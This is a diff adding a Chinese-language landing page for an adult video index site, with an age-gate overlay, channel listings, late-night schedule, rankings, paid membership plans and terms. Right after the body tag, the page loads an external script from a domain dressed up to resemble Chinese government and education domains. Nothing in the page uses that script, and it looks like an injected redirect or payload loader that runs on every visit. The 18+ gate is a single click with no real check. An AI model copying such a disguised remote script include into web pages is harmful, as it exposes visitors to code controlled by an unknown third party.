@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<title>快播AV电影网｜成人向影视资源检索与分级浏览平台</title>
+<meta name="keywords" content="快播AV电影网,成人影视检索,AV电影分级浏览,深夜剧场,会员专区,影视资源索引">
+<meta name="description" content="快播AV电影网（kuaiboavdianyingwang-zh.github.io）定位为成人向影视资源检索与分级浏览平台，提供深夜剧场、会员专区及影视索引入口，访问前请完成年龄验证并遵守所在地区法律法规。">
+<link rel="canonical" href="https://kuaiboavdianyingwang-zh.github.io/">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎞️</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0612;
+  --bg2:#130a24;
+  --card:rgba(255,255,255,.05);
+  --line:rgba(255,255,255,.09);
+  --txt:#ece8f5;
+  --sub:#a89fc0;
+  --violet:#8b5cf6;
+  --pink:#ec4899;
+  --cyan:#06b6d4;
+  --r:14px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--bg);
+  color:var(--txt);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+  line-height:1.8;
+  overflow-x:hidden;
+  background-image:
+    radial-gradient(900px 500px at 88% 0%,rgba(139,92,246,.28),transparent 60%),
+    radial-gradient(800px 460px at 8% 35%,rgba(236,72,153,.20),transparent 58%),
+    radial-gradient(700px 420px at 50% 90%,rgba(6,182,212,.14),transparent 60%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;transition:.25s}
+ul{list-style:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+/* 头部 */
+header{position:sticky;top:0;z-index:50;background:rgba(10,6,18,.72);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;height:70px;gap:18px}
+.logo{display:flex;align-items:center;gap:12px;font-size:21px;font-weight:900;flex-shrink:0}
+.logo i{width:40px;height:40px;border-radius:11px;display:grid;place-items:center;font-size:19px;background:linear-gradient(140deg,var(--violet),var(--pink));font-style:normal}
+.logo em{font-style:normal;background:linear-gradient(92deg,var(--cyan),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+.menu{display:flex;gap:2px;margin-left:auto;flex-wrap:wrap}
+.menu a{font-size:15px;padding:9px 14px;border-radius:9px;color:var(--sub);font-weight:600}
+.menu a:hover{color:#fff;background:rgba(255,255,255,.07)}
+.mbtn{display:none;margin-left:auto;width:44px;height:44px;border:1px solid var(--line);background:var(--card);border-radius:11px;color:#fff;font-size:21px;cursor:pointer}
+/* 年龄验证 */
+.verify{display:grid;place-items:center;min-height:100vh;padding:40px 0;position:relative}
+.vbox{max-width:520px;width:100%;background:var(--card);border:1px solid var(--line);border-radius:20px;padding:42px 34px;text-align:center;backdrop-filter:blur(16px);box-shadow:0 20px 60px rgba(0,0,0,.4)}
+.vbox .age{font-size:56px;font-weight:950;letter-spacing:2px;background:linear-gradient(92deg,var(--pink),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+.vbox h2{margin:16px 0 10px;font-size:24px}
+.vbox p{color:var(--sub);font-size:14.5px;margin-bottom:22px}
+.vbox .warn{font-size:13px;color:#fbbf24;background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.25);border-radius:10px;padding:12px 14px;margin-bottom:24px;text-align:left;line-height:1.7}
+.vbtn{display:flex;gap:12px;flex-wrap:wrap}
+.btn{flex:1;min-width:140px;padding:15px 20px;border-radius:11px;font-size:15.5px;font-weight:800;border:1.5px solid transparent;cursor:pointer}
+.btn-y{background:linear-gradient(92deg,var(--violet),var(--pink));color:#fff}
+.btn-y:hover{transform:translateY(-2px);box-shadow:0 10px 26px rgba(236,72,153,.35)}
+.btn-n{border-color:var(--line);color:var(--sub);background:transparent}
+.btn-n:hover{border-color:var(--pink);color:#fff}
+/* 主体 */
+main{padding:60px 0 30px}
+.hero{display:grid;grid-template-columns:1.3fr .7fr;gap:34px;align-items:center;margin-bottom:60px}
+.hero h1{font-size:clamp(30px,5.2vw,54px);line-height:1.22;font-weight:950}
+.hero h1 span{background:linear-gradient(92deg,var(--cyan),var(--violet),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin-top:18px;color:var(--sub);font-size:16.5px;max-width:540px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:30px}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:20px;text-align:center;backdrop-filter:blur(10px)}
+.stat b{display:block;font-size:27px;font-weight:900;background:linear-gradient(92deg,var(--cyan),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:13.5px;color:var(--sub)}
+.vid{background:var(--card);border:1px solid var(--line);border-radius:18px;aspect-ratio:4/5;display:grid;place-items:center;backdrop-filter:blur(10px);position:relative;overflow:hidden}
+.vid::before{content:"";position:absolute;inset:0;background:linear-gradient(160deg,rgba(139,92,246,.4),rgba(236,72,153,.25),rgba(6,182,212,.2))}
+.vid-in{position:relative;z-index:2;text-align:center;padding:20px}
+.vid-in .play{width:76px;height:76px;border-radius:50%;background:rgba(255,255,255,.16);border:2px solid rgba(255,255,255,.5);display:grid;place-items:center;font-size:26px;margin:0 auto 16px;backdrop-filter:blur(8px)}
+.vid-in h3{font-size:19px;margin-bottom:8px}
+.vid-in p{font-size:13.5px;color:var(--sub)}
+/* 区块标题 */
+.sec{padding:44px 0}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:28px;flex-wrap:wrap}
+.sec-head i{font-style:normal;font-size:12.5px;font-weight:800;letter-spacing:1.5px;color:var(--cyan);background:rgba(6,182,212,.12);padding:5px 12px;border-radius:20px}
+.sec-head h2{font-size:clamp(22px,3.2vw,30px);font-weight:900}
+.sec-head span.note{color:var(--sub);font-size:14.5px;width:100%}
+/* 网格 */
+.grid{display:grid;gap:18px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+.g6{grid-template-columns:repeat(6,1fr)}
+.tile{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:22px;backdrop-filter:blur(10px);transition:.3s;cursor:pointer}
+.tile:hover{transform:translateY(-5px);border-color:rgba(236,72,153,.5);background:rgba(255,255,255,.08)}
+.tile .ic{font-size:24px;margin-bottom:12px;display:block}
+.tile h3{font-size:17px;margin-bottom:6px}
+.tile p{color:var(--sub);font-size:14px}
+/* 分级标签 */
+.badge{display:inline-block;font-size:12px;font-weight:800;padding:3px 10px;border-radius:6px;margin-bottom:12px}
+.b-18{background:rgba(236,72,153,.18);color:#f9a8d4;border:1px solid rgba(236,72,153,.3)}
+.b-21{background:rgba(139,92,246,.2);color:#c4b5fd;border:1px solid rgba(139,92,246,.35)}
+.b-all{background:rgba(6,182,212,.16);color:#67e8f9;border:1px solid rgba(6,182,212,.3)}
+/* 剧场行 */
+.row{display:grid;grid-template-columns:140px 1fr;gap:20px;padding:18px 0;border-bottom:1px solid var(--line)}
+.row:last-child{border-bottom:none}
+.row .time{font-size:15px;font-weight:850;color:var(--cyan)}
+.row h4{font-size:17.5px;margin-bottom:5px}
+.row p{color:var(--sub);font-size:14px}
+.row .meta{margin-top:8px;display:flex;gap:8px;flex-wrap:wrap}
+.row .meta i{font-style:normal;font-size:12.5px;background:rgba(255,255,255,.06);color:var(--sub);padding:3px 10px;border-radius:20px}
+/* 排行 */
+.rank{display:flex;align-items:center;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:18px;backdrop-filter:blur(10px);transition:.25s}
+.rank:hover{border-color:rgba(6,182,212,.5);background:rgba(255,255,255,.08)}
+.rank .no{font-size:26px;font-weight:950;width:44px;flex-shrink:0;text-align:center;background:linear-gradient(140deg,var(--violet),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.rank .txt{flex:1}
+.rank .txt h4{font-size:16.5px}
+.rank .txt p{font-size:13.5px;color:var(--sub)}
+.rank .val{font-weight:850;color:var(--cyan);font-size:15px;flex-shrink:0}
+/* 会员 */
+.vip{background:linear-gradient(135deg,rgba(139,92,246,.22),rgba(236,72,153,.18));border:1px solid rgba(236,72,153,.3);border-radius:20px;padding:38px;backdrop-filter:blur(12px)}
+.vip h2{font-size:clamp(21px,3vw,28px);margin-bottom:10px}
+.vip p{color:var(--sub);max-width:540px;margin-bottom:22px}
+.plans{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.plan{background:rgba(10,6,18,.45);border:1px solid var(--line);border-radius:var(--r);padding:26px;text-align:center}
+.plan.hot{border-color:var(--pink);box-shadow:0 0 0 1px var(--pink),0 14px 40px rgba(236,72,153,.2)}
+.plan h4{font-size:18px;margin-bottom:10px}
+.plan .price{font-size:30px;font-weight:950;margin-bottom:4px}
+.plan .price small{font-size:14px;font-weight:600;color:var(--sub)}
+.plan ul{margin:18px 0;text-align:left}
+.plan ul li{font-size:14px;color:var(--sub);padding:6px 0;border-bottom:1px dashed rgba(255,255,255,.07)}
+.plan a{display:block;padding:12px;border-radius:9px;font-size:15px;font-weight:800;border:1px solid var(--line);color:var(--sub)}
+.plan a:hover{background:linear-gradient(92deg,var(--violet),var(--pink));color:#fff;border-color:transparent}
+/* 表单 */
+.fm{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:34px;backdrop-filter:blur(12px);display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fm input,.fm select,.fm textarea{grid-column:span 1;padding:14px 16px;border-radius:10px;border:1px solid var(--line);background:rgba(10,6,18,.4);color:#fff;font-size:15px;outline:none;font-family:inherit}
+.fm input:focus,.fm select:focus,.fm textarea:focus{border-color:var(--violet)}
+.fm textarea{grid-column:span 2;min-height:110px;resize:vertical}
+.fm button{grid-column:span 2;padding:15px;border:none;border-radius:10px;background:linear-gradient(92deg,var(--violet),var(--pink));color:#fff;font-size:16px;font-weight:850;cursor:pointer}
+.fm button:hover{opacity:.92}
+/* 条款 */
+.terms{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:26px;backdrop-filter:blur(10px)}
+.terms h3{font-size:18px;margin-bottom:12px}
+.terms ol{list-style:decimal;padding-left:20px;color:var(--sub);font-size:14.5px}
+.terms ol li{margin-bottom:9px;padding-left:6px}
+.terms ol li b{color:var(--txt);font-weight:700}
+/* 页脚 */
+footer{margin-top:40px;border-top:1px solid var(--line);padding:46px 0 24px;background:rgba(0,0,0,.25)}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;margin-bottom:30px}
+.ft .logo{color:#fff}
+.ft p{margin-top:12px;font-size:14.5px;color:var(--sub)}
+.ft h4{font-size:15.5px;margin-bottom:16px;color:#fff}
+.ft ul li{margin-bottom:10px}
+.ft ul a{color:var(--sub);font-size:14.5px}
+.ft ul a:hover{color:var(--pink)}
+.cp{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;border-top:1px solid var(--line);padding-top:22px;font-size:13.5px;color:var(--sub)}
+.cp-links a{color:var(--sub)}
+.cp-links a:hover{color:#fff}
+.cp-links a+a{margin-left:18px}
+#top{position:fixed;right:18px;bottom:22px;width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--violet),var(--pink));color:#fff;display:none;place-items:center;font-size:20px;cursor:pointer;z-index:60}
+#top.show{display:grid}
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr}
+  .g4,.plans{grid-template-columns:repeat(2,1fr)}
+  .g6{grid-template-columns:repeat(3,1fr)}
+  .ft{grid-template-columns:1fr 1fr;gap:26px}
+}
+@media(max-width:640px){
+  .wrap{padding:0 16px}
+  .sec{padding:34px 0}
+  .mbtn{display:grid;place-items:center}
+  .menu{display:none;position:absolute;top:70px;left:0;right:0;flex-direction:column;background:rgba(10,6,18,.96);padding:14px;border-bottom:1px solid var(--line)}
+  .menu.open{display:flex}
+  .menu a{padding:13px 16px}
+  .g4,.g3,.g2,.g6,.plans,.fm{grid-template-columns:1fr}
+  .row{grid-template-columns:1fr;gap:6px}
+  .fm textarea,.fm button{grid-column:span 1}
+  .ft{grid-template-columns:1fr}
+  .vbox{padding:32px 22px}
+  .nav{height:62px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 年龄验证层 -->
+<div class="verify" id="verify">
+  <div class="vbox">
+    <div class="age">18+</div>
+    <h2>成人内容访问验证</h2>
+    <p>本平台内容仅限年满 18 周岁（或所在地区法定成年年龄）的成年人访问。</p>
+    <div class="warn">
+      ⚠️ 访问提示：进入后你将被要求确认已成年；你所在地区对成人内容可能有法律限制，请务必遵守当地法律法规。未成年人、或不认同相关规定的访客，请勿进入。
+    </div>
+    <div class="vbtn">
+      <button class="btn btn-y" id="yesBtn">我已成年，进入</button>
+      <button class="btn btn-n" onclick="location.href='https://www.bing.com'">离开本站</button>
+    </div>
+  </div>
+</div>
+
+<!-- 主站（默认隐藏，验证后显示） -->
+<div id="site" style="display:none">
+
+<header>
+  <div class="wrap nav">
+    <a href="#top" class="logo"><i>🎞️</i>快播<em>AV电影网</em></a>
+    <nav class="menu" id="menu">
+      <a href="#zone">频道分区</a>
+      <a href="#theater">深夜剧场</a>
+      <a href="#rank">热度排行</a>
+      <a href="#vip">会员服务</a>
+      <a href="#terms">使用条款</a>
+      <a href="#report">举报留言</a>
+    </nav>
+    <button class="mbtn" id="mbtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main id="top">
+
+  <section class="hero wrap">
+    <div>
+      <h1>成人向影视<br><span>分级检索平台</span></h1>
+      <p>快播AV电影网（kuaiboavdianyingwang-zh.github.io）是一个以成人向影视资源检索与分级浏览为主的平台，提供频道分区、深夜剧场排片与会员服务，进入前请完成年龄验证。</p>
+      <div class="stats">
+        <div class="stat"><b>18+</b><span>年龄门槛</span></div>
+        <div class="stat"><b>6</b><span>内容频道</span></div>
+        <div class="stat"><b>24H</b><span>在线审核</span></div>
+      </div>
+    </div>
+    <div class="vid">
+      <div class="vid-in">
+        <div class="play">▶</div>
+        <h3>分级浏览说明</h3>
+        <p>所有内容按年龄分级展示<br>请先完成验证再访问</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 频道分区 -->
+  <section class="sec wrap" id="zone">
+    <div class="sec-head">
+      <i>ZONE / 01</i>
+      <h2>频道分区</h2>
+      <span class="note">按内容类型与分级划分，各分区访问规则不同</span>
+    </div>
+    <div class="grid g4">
+      <div class="tile"><span class="badge b-18">18+</span><span class="ic">🌙</span><h3>深夜剧场</h3><p>定时更新的成人向排片剧场，需验证后进入。</p></div>
+      <div class="tile"><span class="badge b-18">18+</span><span class="ic">🔥</span><h3>热门精选</h3><p>站内访问热度较高的内容索引入口。</p></div>
+      <div class="tile"><span class="badge b-21">21+</span><span class="ic">🚫</span><h3>限制级专区</h3><p>仅向完成双重验证的用户开放，规则更严格。</p></div>
+      <div class="tile"><span class="badge b-all">全站</span><span class="ic">📋</span><h3>分级索引</h3><p>所有内容的分级目录，方便快速定位。</p></div>
+    </div>
+  </section>
+
+  <!-- 深夜剧场 -->
+  <section class="sec wrap" id="theater" style="border-top:1px solid var(--line)">
+    <div class="sec-head">
+      <i>SCHEDULE / 02</i>
+      <h2>深夜剧场排片</h2>
+      <span class="note">以下为当周排片示例，实际内容以站内验证后展示为准</span>
+    </div>
+    <div class="grid">
+      <div class="row"><div class="time">22:00</div><div><h4>《午夜频道》开场单元</h4><p>深夜档开场，介绍本周排片与分级提示。</p><div class="meta"><i>18+</i><i>周一至周四</i><i>60 分钟</i></div></div></div>
+      <div class="row"><div class="time">23:30</div><div><h4>《都市物语》连续单元</h4><p>以都市情感为背景的系列短片合集。</p><div class="meta"><i>18+</i><i>周五周六</i><i>90 分钟</i></div></div></div>
+      <div class="row"><div class="time">01:00</div><div><h4>《经典回放》怀旧单元</h4><p>精选往期内容重新编排播出。</p><div class="meta"><i>18+</i><i>每日</i><i>120 分钟</i></div></div></div>
+      <div class="row"><div class="time">03:00</div><div><h4>《会员加映》专属单元</h4><p>会员专享的额外排片内容。</p><div class="meta"><i>21+</i><i>会员</i><i>60 分钟</i></div></div></div>
+    </div>
+  </section>
+
+  <!-- 热度排行 -->
+  <section class="sec wrap" id="rank" style="border-top:1px solid var(--line)">
+    <div class="sec-head">
+      <i>RANKING / 03</i>
+      <h2>本周热度排行</h2>
+      <span class="note">基于站内访问与互动数据综合计算，每周一更新</span>
+    </div>
+    <div class="grid g2">
+      <div class="rank"><div class="no">01</div><div class="txt"><h4>《午夜频道》Vol.12</h4><p>深夜开场单元 · 18+</p></div><div class="val">9.6 万</div></div>
+      <div class="rank"><div class="no">02</div><div class="txt"><h4>《都市物语》EP.07</h4><p>都市情感系列 · 18+</p></div><div class="val">8.4 万</div></div>
+      <div class="rank"><div class="no">03</div><div class="txt"><h4>《经典回放》特辑</h4><p>怀旧精选 · 18+</p></div><div class="val">7.1 万</div></div>
+      <div class="rank"><div class="no">04</div><div class="txt"><h4>《会员加映》Vol.05</h4><p>会员专属 · 21+</p></div><div class="val">5.9 万</div></div>
+      <div class="rank"><div class="no">05</div><div class="txt"><h4>《导演剪辑版》合集</h4><p>未删减版本索引 · 21+</p></div><div class="val">4.3 万</div></div>
+      <div class="rank"><div class="no">06</div><div class="txt"><h4>《幕后访谈》系列</h4><p>制作幕后与访谈 · 18+</p></div><div class="val">3.8 万</div></div>
+    </div>
+  </section>
+
+  <!-- 会员服务 -->
+  <section class="sec wrap" id="vip" style="border-top:1px solid var(--line)">
+    <div class="sec-head">
+      <i>MEMBER / 04</i>
+      <h2>会员服务</h2>
+      <span class="note">会员仅提供分级内容访问权限，不提供任何违法违规内容</span>
+    </div>
+    <div class="vip">
+      <h2>选择适合你的访问权限</h2>
+      <p>所有方案均需先通过年龄验证，会员等级仅决定可访问的分级范围与排片权益。</p>
+      <div class="plans">
+        <div class="plan"><h4>免费访客</h4><div class="price">0<small> 元/月</small></div><ul><li>完成年龄验证</li><li>浏览公开索引</li><li>查看排片表</li></ul><a href="#">立即验证</a></div>
+        <div class="plan hot"><h4>标准会员</h4><div class="price">39<small> 元/月</small></div><ul><li>18+ 分区访问</li><li>无广告浏览</li><li>每周精选推送</li></ul><a href="#">开通会员</a></div>
+        <div class="plan"><h4>尊享会员</h4><div class="price">99<small> 元/月</small></div><ul><li>21+ 专区访问</li><li>会员加映排片</li><li>优先客服响应</li></ul><a href="#">开通会员</a></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 使用条款 -->
+  <section class="sec wrap" id="terms" style="border-top:1px solid var(--line)">
+    <div class="sec-head">
+      <i>RULES / 05</i>
+      <h2>访问与内容条款</h2>
+      <span class="note">使用本站即表示你已阅读并同意以下条款</span>
+    </div>
+    <div class="grid g2">
+      <div class="terms">
+        <h3>年龄与法律</h3>
+        <ol>
+          <li><b>年龄要求</b>：你必须年满 18 周岁，或达到所在地区的法定成年年龄，方可访问本站内容。</li>
+          <li><b>法律合规</b>：你须自行确认所在地区对成人内容的法律规定，并承诺不违反当地法律法规。</li>
+          <li><b>禁止传播</b>：严禁将站内任何内容转发、下载或传播给未成年人或第三方。</li>
+        </ol>
+      </div>
+      <div class="terms">
+        <h3>账号与举报</h3>
+        <ol>
+          <li><b>账号安全</b>：会员账号仅限本人使用，不得转让、借用或共享。</li>
+          <li><b>内容审核</b>：站内内容持续审核，如发现违规可随时通过举报渠道反馈。</li>
+          <li><b>违规处理</b>：违反上述条款的账号将被限制或封禁，情节严重者将配合有关部门处理。</li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <!-- 举报留言 -->
+  <section class="sec wrap" id="report" style="border-top:1px solid var(--line)">
+    <div class="sec-head">
+      <i>REPORT / 06</i>
+      <h2>举报与留言</h2>
+      <span class="note">发现违规内容或有建议，欢迎反馈，我们会在 24 小时内处理</span>
+    </div>
+    <form class="fm" onsubmit="event.preventDefault();this.reset();alert('提交成功，感谢你的反馈！')">
+      <input type="text" placeholder="昵称（可匿名）" required>
+      <select required><option value="">举报类型</option><option>违规内容</option><option>未成年人访问</option><option>版权问题</option><option>其他建议</option></select>
+      <input type="url" placeholder="相关链接（选填）">
+      <input type="email" placeholder="联系方式（选填）">
+      <textarea placeholder="请描述具体情况，我们会严格保密…" required></textarea>
+      <button type="submit">提交反馈</button>
+    </form>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <a href="#top" class="logo"><i>🎞️</i>快播<em>AV电影网</em></a>
+        <p>快播AV电影网是一个成人向影视资源检索与分级浏览平台，进入前请完成年龄验证并遵守当地法律法规。</p>
+      </div>
+      <div><h4>内容频道</h4><ul><li><a href="#zone">频道分区</a></li><li><a href="#theater">深夜剧场</a></li><li><a href="#rank">热度排行</a></li><li><a href="#vip">会员服务</a></li></ul></div>
+      <div><h4>分级说明</h4><ul><li><a href="#">18+ 内容</a></li><li><a href="#">21+ 内容</a></li><li><a href="#">限制级专区</a></li><li><a href="#">分级索引</a></li></ul></div>
+      <div><h4>关于平台</h4><ul><li><a href="#terms">使用条款</a></li><li><a href="#report">举报中心</a></li><li><a href="#">隐私政策</a></li><li><a href="#">联系我们</a></li></ul></div>
+    </div>
+    <div class="cp">
+      <span>© 2026 快播AV电影网 kuaiboavdianyingwang-zh.github.io · 仅限成年人访问</span>
+      <span class="cp-links"><a href="#">免责声明</a><a href="#">合规声明</a><a href="#">回到顶部</a></span>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<div id="top" title="返回顶部">↑</div>
+
+<script>
+  // 年龄验证
+  document.getElementById('yesBtn').addEventListener('click',function(){
+    var c=document.getElementById('verify'),s=document.getElementById('site');
+    c.style.transition='opacity .4s';c.style.opacity='0';
+    setTimeout(function(){c.style.display='none';s.style.display='block';window.scrollTo(0,0);},380);
+  });
+  // 移动菜单
+  var mb=document.getElementById('mbtn'),mu=document.getElementById('menu');
+  mb.addEventListener('click',function(){mu.classList.toggle('open')});
+  mu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){mu.classList.remove('open')})});
+  // 返回顶部
+  var tp=document.getElementById('top');
+  window.addEventListener('scroll',function(){tp.classList.toggle('show',window.scrollY>500)});
+  tp.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+
+</body>
+</html>
